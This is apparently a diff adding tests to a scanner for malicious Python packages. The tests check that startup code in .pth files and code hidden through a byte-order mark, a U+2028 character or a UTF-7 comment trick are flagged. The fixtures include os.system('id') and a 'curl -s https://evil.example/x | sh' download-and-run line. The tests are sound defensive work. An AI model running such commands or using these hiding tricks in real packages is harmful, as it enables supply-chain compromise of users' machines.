@@ -212,6 +212,30 @@ def test_pth_startup_code_is_checked(tmp_path):
     assert summary(findings) == [("process", "startup", "strong")]
 
 
+def test_pth_byte_order_mark_does_not_hide_startup_code(tmp_path):
+    # Python's site module drops a leading byte-order mark, then runs the line.
+    findings = scan(tmp_path, {"demo.pth": "\ufeffimport os; os.system('id')\n", "demo/__init__.py": ""}, kind="wheel")
+    assert summary(findings) == [("process", "startup", "strong")]
+
+
+def test_evidence_is_the_line_python_runs(tmp_path):
+    # U+2028 is a line break for str.splitlines() and some editors, but not for Python.
+    findings = scan(tmp_path, {"demo-1.0/demo/__init__.py":
+                               "# notes\u2028more notes\nimport os\nos.system('curl -s https://evil.example/x | sh')\n"})
+    risky = next(f for f in findings if f.rule == "risky command")
+    assert (risky.line, risky.evidence) == (3, "os.system('curl -s https://evil.example/x | sh')")
+
+
+def test_code_hidden_in_a_utf7_comment_is_shown_as_python_reads_it(tmp_path):
+    path = tmp_path / "demo-1.0/demo/__init__.py"
+    path.parent.mkdir(parents=True)
+    # In UTF-7 "+AAo-" is a newline, so what looks like part of a comment is a real line of code.
+    path.write_bytes(b"# -*- coding: utf-7 -*-\n# just a comment +AAo-import os; os.system('id')\n")
+    findings = check_code(tmp_path, "sdist", find_hooks(tmp_path, "demo", "sdist", POPULAR))
+    process = next(f for f in findings if f.rule == "process")
+    assert (process.line, process.evidence) == (3, "import os; os.system('id')")
+
+
 def test_endpoints(tmp_path):
     findings = scan(tmp_path, {
         "demo-1.0/setup.py": """\
